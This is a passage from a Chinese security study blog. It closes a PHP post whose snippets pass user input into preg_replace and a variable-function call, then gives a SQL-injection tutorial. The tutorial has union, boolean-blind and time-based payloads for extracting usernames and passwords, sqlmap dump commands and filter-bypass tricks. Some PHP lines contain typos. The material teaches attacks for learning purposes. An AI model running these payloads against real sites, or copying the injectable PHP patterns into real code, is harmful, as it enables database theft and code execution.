-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$subject</span>=<span class="string">&#x27;hello hack&#x27;</span>;</span><br><span class="line"><span class="variable">$pattern</span>=<span class="string">&#x27;/hack/&#x27;</span>;</span><br><span class="line"><span class="variable">$replacement</span>=<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$subject</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">name = xxx</span><br></pre></td></tr></table></figure>
-
-<h2 id="PHP可变函数"><a href="#PHP可变函数" class="headerlink" title="PHP可变函数"></a>PHP可变函数</h2><p>如果一个变量名后有圆括号，PHP将寻找与变量的值同名的函数，并尝试执行它</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;foo&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"><span class="variable">$arg</span>=<span class="string">&#x27;&#x27;</span></span>)(<span class="params"> </span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">echo</span> <span class="string">&quot;bar&quot;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;</span></span></span><br><span class="line"><span class="params"><span class="function">function echoit(<span class="params"><span class="variable">$string</span></span>)</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">echo</span> <span class="variable">$string</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="variable">$func</span>=<span class="variable">$REQUEST</span>[<span class="string">&#x27;func&#x27;</span>];</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="variable">$string</span>=<span class="variable">$REQUEST</span>[<span class="string">&#x27;string&#x27;</span>];</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">echo</span> <span class="variable">$func</span>(<span class="params"><span class="variable">$string</span></span>);</span></span></span><br><span class="line"><span class="params"><span class="function">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-<div>
-  
-</div>
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/23/SQL-Injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/95856889?s=400&u=aa80da11fcc14ae3054ecbbbe19ee819f8024678&v=4">
-      <meta itemprop="name" content="Xorb_7">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xorb_7's Blog">
-      <meta itemprop="description" content="<font color="#FFFFFF">答案都在路上，自由都在风里...</font>">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Xorb_7's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/11/23/SQL-Injection/" class="post-title-link" itemprop="url">SQL_Injection</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-11-23 12:29:43 / 修改时间：16:10:44" itemprop="dateCreated datePublished" datetime="2024-11-23T12:29:43+08:00">2024-11-23</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><blockquote>
-<p><strong>原理：攻击者通过浏览器或其他客户端将恶意SQL语句插入网站，网站未对其进行过滤，并将恶意SQL语句代入数据库且执行，获取敏感信息或执行其他操作</strong></p>
-</blockquote>
-<p>数字型注入</p>
-<p>字符型注入</p>
-<p>区别：有无用单引号或双引号</p>
-<h2 id="常规查询"><a href="#常规查询" class="headerlink" title="常规查询"></a>常规查询</h2><p>一、判断常见四个信息</p>
-<p>1.数据库版本-看是否符合information_schema查询（MySQL5.0以上自带information_schema）</p>
-<p><strong>-version</strong></p>
-<p>2.数据库用户-看是否符合root型注入攻击（由配置文件决定） </p>
-<p><strong>-user()</strong></p>
-<p>3.当前操作系统-看是否支持大小写或文件路径选择（Linux对大小写敏感）</p>
-<p><strong>-@@version_compile_os</strong></p>
-<p>4.数据库名-为后期猜解指定数据库下的表，列做准备 </p>
-<p><strong>-database()</strong></p>
-<p>二、根据四个信息选择方案</p>
-<p>root：先测试读写，再测试数据；非root：直接测试数据</p>
-<p>三、进行注入</p>
-<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h3 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h3><p>1.判断注入点</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>2.判断列数</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>3.判断报错点</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>（获取当前用户名、数据库名、版本等信息）</p>
-<p>可用concat_ws(char(xx,xx,xx),user(),database(),version())</p>
-<p>4.获取数据库名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>5.获取表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>‘数据库名’ <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-
-
-<blockquote>
-<p>使用group_concat()函数将所有查询的表名连在一起成为一条数据</p>
-</blockquote>
-<p>6.获取列名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span> <span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;数据库名&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>  <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<p>7.获取数据</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password)<span class="keyword">from</span> 数据库名.表名</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> 数据库名.表名 <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Bool注入"><a href="#Bool注入" class="headerlink" title="Bool注入"></a>Bool注入</h2><h3 id="基础函数"><a href="#基础函数" class="headerlink" title="基础函数"></a>基础函数</h3><p>substring(字段名，<em>A,N</em>)</p>
-<p>ascii(‘ ‘)返回字符ASCII码</p>
-<h3 id="注入过程-1"><a href="#注入过程-1" class="headerlink" title="注入过程"></a>注入过程</h3><p>判断数据库长度</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="number">3</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;=3 --+</span></span><br></pre></td></tr></table></figure>
-
-<p>1.获取数据库名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span><span class="operator">/</span><span class="number">2</span><span class="operator">/</span><span class="number">3.</span>..,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr(database(),1/2/3...,1)=&#x27;</span>a<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
-
-<p>利用穷举效率太低，可以bp爆破</p>
-<p>2.获取表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span><span class="operator">/</span><span class="number">2</span><span class="operator">/</span><span class="number">3.</span>..,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;g&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select table_name  from information_schema.tables where table_schema=&#x27;</span>数据库名<span class="string">&#x27; limit 0,1) ,1/2/3...,1)=&#x27;</span>g<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
-
-<p>3.获取列名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库名&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span><span class="operator">/</span><span class="number">2</span><span class="operator">/</span><span class="number">3.</span>..,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select column_name  from information_schema.columns where table_schema=&#x27;</span>数据库名<span class="string">&#x27; and table_name=&#x27;</span>表名<span class="string">&#x27; limit 0,1) ,1/2/3...,1)=&#x27;</span>c<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
-
-<p>4.获取数据</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> username <span class="keyword">from</span> 数据库名.表名 limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span><span class="operator">/</span><span class="number">2</span><span class="operator">/</span><span class="number">3.</span>..,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;h&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> password <span class="keyword">from</span> 数据库名.表名 limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span><span class="operator">/</span><span class="number">2</span><span class="operator">/</span><span class="number">3.</span>..,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;n&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select username from 数据库名.表名 limit 0,1) ,1/2/3...,1)=&#x27;</span>h<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> password <span class="keyword">from</span> 数据库名.表名 limit <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span><span class="operator">/</span><span class="number">2</span><span class="operator">/</span><span class="number">3.</span>..,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;n&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Sleep注入"><a href="#Sleep注入" class="headerlink" title="Sleep注入"></a>Sleep注入</h2><h3 id="基础函数-1"><a href="#基础函数-1" class="headerlink" title="基础函数"></a>基础函数</h3><p>sleep是睡眠函数，可以使查询数据时回显数据的响应时间加长。使用方法如sleep(N)，这里的N为睡眠的时间。<br>使用时可以配合if进行使用。如:<br>sleep()<br>if(ascii(substr(user()1,1))&#x3D;114,sleep(5)2)<br>这样的话，如果user的第一位是’”’，则页面返回将延迟5秒。这里需要注意的是，这5秒是在服务器端的数据库中延迟的，实际情况可能会由于网络环境等因素延迟更长时间<br>benchmark函数原本是用来重复执行某个语句的函数，我们可以用这个函数来测试数据库的读写性能等。使用方法如下:<br>benchmark(N，expression)<br>其中，N为执行的次数，expression为表达式。如果需要进行盲注，我们通常需要进行消耗时间和性能的计算，比如哈希计算函数MD5，将MD5(),函数重复执行数万次则可以达到延迟的效果，而具体的情况需要根据不同比赛的服务器性能及网络情况来决定</p>
-<h3 id="注入过程-2"><a href="#注入过程-2" class="headerlink" title="注入过程"></a>注入过程</h3><p>判断数据库长度</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">10</span>),<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(10),1) --+</span></span><br></pre></td></tr></table></figure>
-
-<p>1.获取数据库名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"> ?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))=115,1,sleep(10)) --+</span></span><br></pre></td></tr></table></figure>
-
-<p>2.获取表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot;limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot;limit 0,1),1,1))=101,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>
-
-<p>3.获取列名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;数据库名&quot; <span class="keyword">and</span> table_name<span class="operator">=</span>&quot;表名&quot; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">101</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&quot;数据库名&quot; and table_name=&quot;表名&quot; limit 0,1),1,1))=101,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>
-
-<p>4.获取数据</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> 数据库名.表名 limit <span class="number">0</span>,<span class="number">1</span>),N,<span class="number">1</span>)))<span class="operator">=</span><span class="number">101</span>,<span class="number">0</span>,sleep(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> password <span class="keyword">from</span> 数据库名.表名 limit <span class="number">0</span>,<span class="number">1</span>),N,<span class="number">1</span>)))<span class="operator">=</span><span class="number">101</span>,<span class="number">0</span>,sleep(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if((select ascii(substr((select username from 数据库名.表名 limit 0,1),N,1)))=101,0,sleep(5)) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> if((<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> password <span class="keyword">from</span> 数据库名.表名 limit <span class="number">0</span>,<span class="number">1</span>),N,<span class="number">1</span>)))<span class="operator">=</span><span class="number">101</span>,<span class="number">0</span>,sleep(<span class="number">5</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="基础函数-2"><a href="#基础函数-2" class="headerlink" title="基础函数"></a>基础函数</h3><p>floor()函数rand()函数</p>
-<p>updateXML(xml_document, xpath_string,new_value)</p>
-<p>extractValue(xml_document, xpath_string)</p>
-<h3 id="注入过程-3"><a href="#注入过程-3" class="headerlink" title="注入过程"></a>注入过程</h3><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>mysql在使用GBK编码时，第一个字符ASCII码大于128，会认为两个字符是个汉字，将后面转义吃掉</p>
-<p>addslashes对单引号等字符进行转义，可避免注入</p>
-<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>addslashes函数过滤，将特殊字符进行转义，但特殊字符本身不存入数据库，再次查询时没过滤，造成SQL注入</p>
-<h2 id="SQL注入工具—sqlmap"><a href="#SQL注入工具—sqlmap" class="headerlink" title="SQL注入工具—sqlmap"></a>SQL注入工具—sqlmap</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>sqlmap支持5种模式：bool盲注、sleep盲注、报错注入、union注入、堆查询注入（可同时执行多条语句）</p>
-<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p><img src="C:\Users\lrq\Desktop\学习笔记\sqlmap常用参数.jpg" alt="sqlmap常用参数"></p>
-<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>1、检测注入点</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u <span class="string">&#x27;http://xx/?id=1&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>2、查看所有数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u <span class="string">&#x27;http://xx/?id=1&#x27;</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
-
-<p>3、查看当前使用的数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u <span class="string">&#x27;http://xx/?id=1&#x27;</span> <span class="comment">--current-db</span></span><br></pre></td></tr></table></figure>
-
-<p>4、查看数据表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u <span class="string">&#x27;http://xx/?id=1&#x27;</span> <span class="operator">-</span>D <span class="string">&#x27;DBname&#x27;</span> <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p>5、查看字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u <span class="string">&#x27;http://xx/?id=1&#x27;</span> <span class="operator">-</span>D <span class="string">&#x27;DBname&#x27;</span> <span class="operator">-</span>T <span class="string">&#x27;TBname&#x27;</span> <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
-
-<p>6、查看数据</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u <span class="string">&#x27;http://xx/?id=1&#x27;</span> <span class="operator">-</span>D <span class="string">&#x27;DBname&#x27;</span> <span class="operator">-</span>T <span class="string">&#x27;TBname&#x27;</span> <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><h4 id="绕过"><a href="#绕过" class="headerlink" title="&#x2F;**&#x2F;绕过"></a>&#x2F;**&#x2F;绕过</h4><h4 id="制表符绕过"><a href="#制表符绕过" class="headerlink" title="制表符绕过"></a>制表符绕过</h4><p>制表符是不可见字符，需要编码，%09</p>
-<h4 id="换行符绕过"><a href="#换行符绕过" class="headerlink" title="换行符绕过"></a>换行符绕过</h4><p>换行符是不可见字符，需要编码，%0a</p>
-<h4 id="括号绕过"><a href="#括号绕过" class="headerlink" title="括号绕过"></a>括号绕过</h4><h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UnIoN SeLeCT xxx --+</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNIunionONSeLselectECT1,2,3 --+</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="双重url编码绕过"><a href="#双重url编码绕过" class="headerlink" title="双重url编码绕过"></a>双重url编码绕过</h4><h4 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h4><h4 id="ASCII编码绕过"><a href="#ASCII编码绕过" class="headerlink" title="ASCII编码绕过"></a>ASCII编码绕过</h4><h3 id="等价函数字符替换绕过"><a href="#等价函数字符替换绕过" class="headerlink" title="等价函数字符替换绕过"></a>等价函数字符替换绕过</h3><h4 id="用like或in代替"><a href="#用like或in代替" class="headerlink" title="用like或in代替&#x3D;,&lt;,&gt;"></a>用like或in代替&#x3D;,&lt;,&gt;</h4><h4 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h4><p>1.逗号被过滤时可以使用from…for…</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(<span class="keyword">select</span> database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
-<p>2.limit中的逗号可以替换成offset</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
-
-<h4 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h4><p>1.sleep函数用benchmark函数代替</p>
-<p>2.ascii函数用hex、bin函数代替</p>
-<p>3.group_concat函数用concat_ws函数代替</p>
